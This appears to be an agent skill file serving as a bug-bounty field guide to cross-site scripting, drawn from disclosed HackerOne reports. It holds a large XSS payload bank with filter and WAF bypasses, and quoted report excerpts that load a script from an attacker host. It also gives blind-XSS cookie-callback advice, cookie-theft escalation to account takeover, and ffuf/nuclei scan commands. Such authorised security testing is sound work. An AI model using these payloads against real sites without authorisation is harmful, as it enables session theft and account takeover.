---
name: hackerone-xss
description: >-
  Hunt reflected, stored, and DOM XSS. Use when testing input reflection, HTML/JS sinks, CSP, rich-text editors, markdown renderers, or client-side frameworks. Backed by 2,569 disclosed HackerOne reports.
---

# Cross-Site Scripting (XSS) — HackerOne field guide

Built from **2,569** publicly disclosed HackerOne reports (2013–2026). Corpus: `~/.local/share/hackerone-reports/`.

## Signal

- Reports: **2,569** · paid: **546**
- Median bounty **$500** · p90 **$2,500** · max **$16,000** · total **$548,499**
- Median upvotes **11**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 57 | $92,530 | 3692 |
| Shopify | 129 | $83,350 | 5563 |
| Uber | 51 | $61,250 | 1642 |
| Mail.ru | 291 | $51,870 | 4740 |
| HackerOne | 33 | $27,750 | 3084 |
| Internet Bug Bounty | 17 | $17,265 | 498 |
| Reddit | 10 | $15,500 | 1343 |
| Open-Xchange | 34 | $14,400 | 366 |

## Quick wins

Start here. These are the highest-yield tests for this class.

- Reflect a unique canary in every param, path segment, header (Referer, UA, X-Forwarded-*), cookie, and JSON field; look for unencoded reflection in text/html.
- Test URL sinks separately: href/src, iframe srcdoc, formaction, xlink:href, meta refresh, and CSS url().
- Stored vectors: profile name/company, filenames, support tickets, webhook URLs, calendar invites, email subjects, admin notes.
- DOM: trace location.hash/search, postMessage, document.referrer, and localStorage into innerHTML, eval, setTimeout, jQuery .html(), or framework sinks.
- Blind XSS: inject into admin-visible fields and log viewers with a callback that reports cookies, DOM, and URL.
- Check markdown/rich-text pipelines: HTML is often sanitized before markdown is rendered, or vice versa.

## Payloads & probes

- HTML body -> `<svg onload=alert(document.domain)>` `<img src=x onerror=alert(1)>`
- Attribute -> `" autofocus onfocus=alert(1) x="` `' onmouseover='alert(1)`
- JS string -> `';alert(1)//` `\';alert(1)//` `</script><script>alert(1)</script>`
- URL sink -> `javascript:alert(1)` `data:text/html,<script>alert(1)</script>` `vbscript:msgbox(1)`
- Markdown -> `[x](javascript:alert(1))` `![x](x" onerror="alert(1))`
- Angular -> `{{constructor.constructor('alert(1)')()}}`
- mXSS -> `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`

## Payload bank

**89 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### HTML injection — body

```text
<script>alert(document.domain)</script>
<script>alert(1)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe srcdoc="<script>alert(parent.document.domain)</script>">
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<form><button formaction=javascript:alert(1)>X</button>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=onmouseover to=alert(1)>
<svg><script>alert(1)</script></svg>
<xss autofocus tabindex=1 onfocusin=alert(1)>
```

### Attribute breakout

```text
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
' autofocus onfocus='alert(1)' x='
" onmouseover="alert(1)
' onmouseover='alert(1)
"><svg onload=alert(1)>
"><script>alert(1)</script>
"><iframe src=javascript:alert(1)>
` onmouseover=alert(1) `
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
</style><script>alert(1)</script>
</xmp><script>alert(1)</script>
```

### JavaScript string / script context

```text
';alert(1)//
\';alert(1)//
";alert(1)//
</script><script>alert(1)</script>
</script><svg onload=alert(1)>
'-alert(1)-'
'-alert(1)//
${alert(1)}
#{alert(1)}
\u003cscript\u003ealert(1)\u003c/script\u003e
\x3cscript\x3ealert(1)\x3c/script\x3e
\u0000<script>alert(1)</script>
```

### URL, CSS & markup sinks

```text
javascript:alert(1)
javascript://%0aalert(1)
javas&#99;ript:alert(1)
java	script:alert(1)
java\nscript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:msgbox(1)
<a href="javascript:alert(1)">x</a>
<a href="data:text/html,<script>alert(1)</script>">x</a>
<base href="javascript:/a/-alert(1)//">
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<link rel=stylesheet href=javascript:alert(1)>
<div style="background:url(javascript:alert(1))">
<style>@import 'javascript:alert(1)';</style>
```

### Filter & WAF bypass

```text
<scr<script>ipt>alert(1)</scr</script>ipt>
<ScRiPt>alert(1)</sCrIpT>
<<script>script>alert(1)<</script>/script>
<img/src=x/onerror=alert(1)>
<img src=x onerror=alert(1)////>
<svg%0aonload=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E
&lt;script&gt;alert(1)&lt;/script&gt;
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg onload=confirm`1`>
<svg onload=alert(1) >
<img src=x onerror=alert(1)%00>
<img src=x onerror=alert(1)<!-->
<img src=x onerror=alert(1)<!--->
<a href="&#x6a;avascript:alert(1)">x</a>
<img src=x onerror=&#x61;lert(1)>
```

### DOM & framework sinks

```text
#<img src=x onerror=alert(1)>
#javascript:alert(document.domain)
?next=javascript:alert(1)
{"html":"<img src=x onerror=alert(1)>"}
{"type":"message","data":"<img src=x onerror=alert(1)>"}
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{_openBlock.constructor('alert(1)')()}}
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_xss.txt` (89)
- `~/.local/share/hackerone-reports/wordlists/payloads_xss_waf.txt` (18 filter/WAF-focused)

## Bypass tricks

- Encode < as &lt;, %3C, \u003c, or fullwidth ＜; double-encode when the server decodes twice.
- Sanitizer gaps: data-* attributes, xlink:href, mXSS, DOMPurify version CVEs, sanitize-then-decode order.
- CSP bypass: JSONP endpoints, base-uri, dangling markup, whitelisted CDN, Angular/Vue gadgets.
- Filter bypass: `<scr<script>ipt>`, mixed case, null bytes, `<!-->`, HTML comments inside tags.
- Browser parsing quirks: `<svg><p><style><img src=x onerror=...>`, nested forms, namespace confusion.

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`q` `s` `search` `query` `lang` `next` `return` `url` `redirect` `callback` `name` `title` `bio` `message` `comment` `filename` `theme` `template`

## Tools

`dalfox` · `kxss` · `XSStrike` · `Burp DOM Invader` · `waybackurls | gf xss | httpx` · `interactsh`

## Escalation chains

- Cookie/token theft -> account takeover.
- XSS in admin context -> CSRF bypass -> privileged action.
- XSS + service worker -> persistent compromise.

## Deeper checklist

- Map every reflection: URL params, path segments, headers (Referer/UA/X-Forwarded-*), cookies, JSON error messages.
- Classify the sink: HTML body, attribute, JS string, URL, CSS, or DOM (innerHTML, eval, location, postMessage).
- Try context-breaking payloads per sink, then encoding bypasses (double URL, unicode, HTML entities, mixed case).
- Test stored vectors: profile fields, filenames, support tickets, comments, webhooks, admin views, emails.
- Test DOM XSS via hash/search/postMessage and client-side routers; trace sources to sinks manually.
- Check sanitizer bypasses: DOMPurify versions, mutation XSS, allowed-tag/attr gaps, markdown-to-HTML pipelines.
- Try CSP bypass: JSONP endpoints, base-uri, dangling markup, script gadgets, whitelisted CDNs.
- Look for blind XSS in admin panels and log viewers; use a callback payload with context metadata.
- Confirm execution in a real browser (not just reflection) and capture the URL, payload, and impact.

## Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Stored XSS in Wiki pages** — `#526325` · GitLab · $0 · ▲633
  > GitLab application converts the Markdown string `.alert(1);` to the href attribute `javascript:alert(1);`.
- **Stored XSS on imgur profile** — `#484434` · Imgur · $0 · ▲614
  > ”/ & lt; script alert(1)& lt;/scr ipt&gt”/ remove the underscores.
- **The return of the ＜** — `#639684` · Rockstar Games · $1,000 · ▲576
  > =[̕h+͓.＜script/src=//evil.site/poc.js .͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
- **[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure** — `#401793` · Grab · $0 · ▲552
  > I've found a set of possible deeplinks, one of them ( ) could lead that an arbtrary URL was opened in a built-in browser in activity using that code (should be used in an external browser/messenger)
- **XSS in steam react chat client** — `#409850` · Valve · $7,500 · ▲499
  > React has strong XSS mitigations but does not mitigate `javascript:` URI based XSS.
- **Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration** — `#968082` · TikTok · $0 · ▲473
  > While fuzzing, I discovered a URL parameter reflecting its value without being properly sanitized.
- **XSS vulnerable parameter in a location hash** — `#146336` · Slack · $0 · ▲455
  > https://slack.com/is ?cvo sid1=111\u0026;typ=55577]")%3balert(document.cookie)%3b//
- **Blind XSS on image upload** — `#1010466` · CS Money · $1,000 · ▲450
  > - The CSRF vulnerability make a request for support.cs.money/upload file; This upload file does not have csrf token/ origin/ reference verification!
- **Stored XSS Vulnerability** — `#643908` · WordPress · $0 · ▲403
  > Paste the payload: " <svg/onload=alert(document.domain)
- **[accounts.reddit.com] Redirect parameter allows for XSS** — `#1962645` · Reddit · $5,000 · ▲394
  > I was tampering with the dest parameter in accounts.reddit.com and found out it is vulnerable to Cross Site Scripting once the victim performs the log in.
- **Reflected XSS on www.hackerone.com and resources.hackerone.com** — `#840759` · HackerOne · $500 · ▲387
  > https://www.hackerone.com/resources/read/embed…
- **HEY.com email stored XSS** — `#982291` · Basecamp · $5,000 · ▲360
  > url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact outbound forwarding[to…
- **Blind XSS on Twitter's internal Big Data panel at █████████████** — `#1207040` · X / xAI · $0 · ▲357
  > An attacker appears to be able to send an XSS payload to Twitter staff members, using a Support Form.
- **Reflected XSS in TikTok endpoints** — `#1350887` · TikTok · $0 · ▲356
  > Cross site scripting vulnerability was found in few TikTok endpoints using the region parameter.
- **Stored XSS in wordpress.com** — `#733248` · Automattic · $0 · ▲356
  > Add the payload `<iframe < <a href=javascript&colon;alert(document.cookie) Click Here</a =&gt;&lt;/iframe&gt;` to the body or the title of the blog post
- **XSS while logging using Google** — `#691611` · Shopify · $1,750 · ▲341
  > Step1: Go to https://YOURSHOP.myshopify.com/admin/settings/account
- **Stored XSS in Private Message component (BuddyPress)** — `#487081` · WordPress · $0 · ▲337
  > Type the following message `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none; </iframe `
- **Stored XSS in my staff name fired in another your internal panel** — `#946053` · Shopify · $0 · ▲326
  > I had lots of tests for bug bounty in my test store "trstore-3.myshopify.com" (created about 4 years ago) and then one of your developers noticed that a stored cross-site scripting payload in my staff name fired in another your internal panel.
- **DOM XSS on duckduckgo.com search** — `#868934` · DuckDuckGo · $0 · ▲326
  > The is a DOM XSS vulnerability on https://duckduckgo.com search through the parameter.
- **yelp.com XSS ATO (via login keylogger, link Google account)** — `#2010530` · Yelp · $0 · ▲324
  > This should be parsed as 1 cookie `a` with the value "`1 b=2`", but Yelp will parse it as 2 cookies `a` and `b`.
- **Stored XSS in markdown via the DesignReferenceFilter** — `#1212067` · GitLab · $16,000 · ▲317
  > `https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout`
- **Stored-XSS-ads.tiktok.com** — `#2306491` · TikTok · $0 · ▲310
  > A stored cross-site scripting (XSS) vulnerability was found on a TikTok Ads endpoint, making it possible for MP4 video files, or files with HTML or JS code to be executed in a user's browser.
- **Stored XSS via Kroki diagram** — `#1731349` · GitLab · $13,950 · ▲295
  > Create an issue and use the following payload `<a <pre lang='f/" onerror=alert(1) onload=alert(1) ' <code lang="wavedrom" xss</code </pre </a `
- **Account takeover through the combination of cookie manipulation and XSS** — `#534450` · Superhuman (formerly Grammarly) · $0 · ▲292
  > Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar containerid with the second stage of our payload and the redirect the user to the vulnerable page.
- **RichText parser vulnerability in scheduled posts allows XSS** — `#1930763` · Reddit · $5,000 · ▲280
  > Intercept the request with Burp Suite/Other proxies and replace the link with javascript scheme payload: {{F2270195}
- **XSS At "pages.et.uber.com"** — `#156098` · Uber · $0 · ▲267
  > https://pages.et.uber.com/icecream/?lang id=5%22%20onmouseover%3dprompt(document.cookie)%20bad%3d%22
- **Stored xss in address field in billing activity at https://shop.aaf.com/Order/step1/index.cfm** — `#411690` · Alliance of American Football · $0 · ▲244
  > enter xss payload (a" <svg/onload=prompt(1) ) in every address field and click on OK proceed
- **XSS at jamfpro.shopifycloud.com** — `#1444682` · Shopify · $9,400 · ▲240
  > Authenticate to `jamfpro.shopifycloud.com` and click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
- **Cross-site Scripting (XSS) on HackerOne careers page** — `#474656` · HackerOne · $500 · ▲239
  > - POC: `https://www.hackerone.com/careers?lever- aaa" <script src="https://app-sj17.marketo.com/index.php/form/getForm?callback=alert" </script `
- **Reflected XSS on www.hackerone.com via Wistia embed code** — `#986386` · HackerOne · $500 · ▲236
  > If the url passed to `i.url.parse` contains a query parameter such as `? proto .ggg=1` then it will end up on the Object prototype, for example visiting `https://www.hackerone.com/blog/scaling-security-startup-unicorn? proto [ggg]=aaa` and typing…

## Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 18× | `javascript:` |
| 5× | `alert(document.domain)` |
| 5× | `<script>` |
| 5× | `<a>` |
| 4× | `alert(1)` |
| 4× | `escapeHTML()` |
| 3× | `<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;` |
| 3× | `<script>alert(document.domain)</script>` |
| 3× | `attacker@example.com` |
| 3× | `wp_targeted_link_rel()` |
| 3× | `alert()` |
| 3× | `<img>` |
| 3× | `<svg>` |
| 3× | `__proto__` |
| 2× | `javascript:alert(1);` |
| 2× | `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>` |
| 2× | `javascript://%0aalert(1)` |
| 2× | `<.*` |
| 2× | `\b \f \n \r \t` |
| 2× | `<%&lt;script/src=//...?` |

## Parameters observed

`url` · `signature` · `_m` · `code` · `redirect_uri` · `token` · `error` · `mode` · `canary` · `callback` · `name` · `hash` · `catalogId` · `langId` · `sso` · `ssoAction` · `client_id` · `error_description` · `search` · `_v`

## Case studies

### Stored XSS in Wiki pages
`#526325` · GitLab · $0 · high · 2019-09-02 · ▲633
> GitLab application converts the Markdown string .alert(1); to the href attribute javascript:alert(1);. Furthermore, Wiki-specific Markdown string . is converted to javascript: in this case.

### Stored XSS on imgur profile
`#484434` · Imgur · $0 · medium · 2019-03-02 · ▲614
> Hello, I submitted a report on imgur, but the staff marked it as duplicate. 482841 I reviewed the report of the first submitted report. 381553 We are on the same situation and his case is already fixed because I tried visiting his site too which is https://12test.imgur.com/ and even redoing his steps to reproduce but no XSS is triggered. And I have a different bypass and my bypass succeed. I can still fire up XSS on the said webpage.

### The return of the ＜
`#639684` · Rockstar Games · $1,000 · high · 2019-09-24 · ▲576
> In this report, the researcher was able to demonstrate a Stored XSS vulnerability in our Message system on the Social Club website. By taking advantage of the fact that '＜' characters are normalized to ' .͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕

### [Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure
`#401793` · Grab · $0 · high · 2019-03-15 · ▲552
> A deeplink feature was found missing validation that led to sensitive information disclosure. Once triggered, the deeplink would direct users to load any attacker-controlled URL within a webview. The impact was further escalated as the webview contain sensitive information. A temporary patch was distributed shortly after the submission was verified and a permanent patch was released and completely rolled out soon after.

### XSS in steam react chat client
`#409850` · Valve · $7,500 · critical · 2019-01-07 · ▲499
> The Steam chat client both sends and receives bbcode format chat messages. These map to HTML elements, and notably the [url] bbcode tag is supported for arbitrary URLs. React has strong XSS mitigations but does not mitigate javascript: URI based XSS. This is rather difficult to exploit as the client transmits sanitised messages and receives over a binary WebSocket. I've attached a video of executing this XSS, which is persistent.

## Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_xss.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_xss.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xss.txt` | 89 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xss_waf.txt` | 18 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_xss.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_xss.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_xss.txt \
     -mr '<hit-marker>' -rate 20
```

## Nuclei

Run the DAST XSS templates against every reflected parameter; add cookies/headers for authenticated surfaces.

```sh
nuclei -u https://target -tags xss,csp-bypass \
       -severity low,medium,high,critical -rl 40 -o nuclei_xss.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/xss -dast \
       -rl 40 -o nuclei_xss_xss.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_xss_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class xss --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class xss
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class xss
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class xss --min-bounty 1000
```

## Related

- `hackerone-csrf` (541 reports)
- `hackerone-open-redirect` (385 reports)
- `hackerone-account-takeover` (262 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.
